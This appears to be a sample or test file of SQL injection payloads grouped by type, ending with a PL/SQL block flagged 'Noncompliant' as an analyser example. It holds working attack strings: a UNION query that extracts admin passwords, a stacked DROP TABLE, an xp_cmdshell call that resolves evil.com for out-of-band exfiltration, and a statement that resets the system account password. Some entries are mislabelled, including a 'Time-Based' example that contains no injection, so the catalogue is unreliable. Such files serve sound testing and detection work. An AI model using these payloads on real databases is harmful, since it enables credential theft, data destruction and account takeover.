-- Classic SQL Injection
SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1';

-- Blind SQL Injection
SELECT * FROM products WHERE product_id=1 OR IF(1=1, SLEEP(5), 0);

-- Time-Based Blind SQL Injection
SELECT * FROM orders WHERE order_id=1;

-- UNION-based SQL Injection
SELECT name, email FROM users WHERE user_id=-1 UNION ALL SELECT username, password FROM admin;

-- Second-Order SQL Injection (initial input)
-- [User input is expected to be inserted into the query later]

-- Stored SQL Injection
INSERT INTO comments (text) VALUES (''); DROP TABLE comment;

-- Out-of-Band SQL Injection
SELECT * FROM users WHERE username='' OR 1=1; EXEC xp_cmdshell('nslookup evil.com');

DECLARE
  c INTEGER;
  sqltext VARCHAR2(100) := 'ALTER USER system IDENTIFIED BY hacker'; -- Might be injected by the user
BEGIN
  c := SYS.DBMS_SYS_SQL.OPEN_CURSOR();                               -- Noncompliant

   -- Will change 'system' user's password to 'hacker'
  SYS.DBMS_SYS_SQL.PARSE_AS_USER(c, sqltext, DBMS_SQL.NATIVE, UID);  -- Non-Compliant

  SYS.DBMS_SYS_SQL.CLOSE_CURSOR(c);                                  -- Noncompliant
END;
/
